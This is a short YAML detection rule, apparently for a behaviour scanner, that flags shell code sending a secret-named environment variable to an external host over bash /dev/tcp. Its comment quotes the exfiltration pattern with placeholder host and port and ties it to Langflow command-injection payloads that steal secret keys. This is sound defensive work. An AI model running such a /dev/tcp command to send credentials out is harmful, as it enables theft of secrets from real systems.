# Secret-named environment variable written to an external bash /dev/tcp
# socket. `... "$APP_SECRET_KEY" > /dev/tcp/<external-ip>/<port>` opens a raw TCP
# connection to an attacker host and sends the credential over it -- no file is
# written, so the /dev/tcp path is purely an exfiltration channel. This is the
# second-stage move in the Langflow MCP command-injection payloads, which push
# LANGFLOW_SECRET_KEY / LANGFLOW_SUPERUSER_PASSWORD to a collector; the matcher
# binds a credential-named var to a /dev/tcp external endpoint and is not tied
# to any variable name or host.
defaults:
  platforms: [unix]
  for: [shell]
  attack: "T1552.001,T1041"
  mbc: E1020

composite_rules:
  - id: secret-env-var-to-devtcp-endpoint
    desc: Sends secret env var to external /dev/tcp socket
    crit: hostile
    conf: 0.95
    near_bytes: 240
    all:
      - id: micro-behaviors/os/env/secret-name::shell-secret-env-dollar-ref
      - id: micro-behaviors/communications/socket/tcp::dev-tcp-external-ip
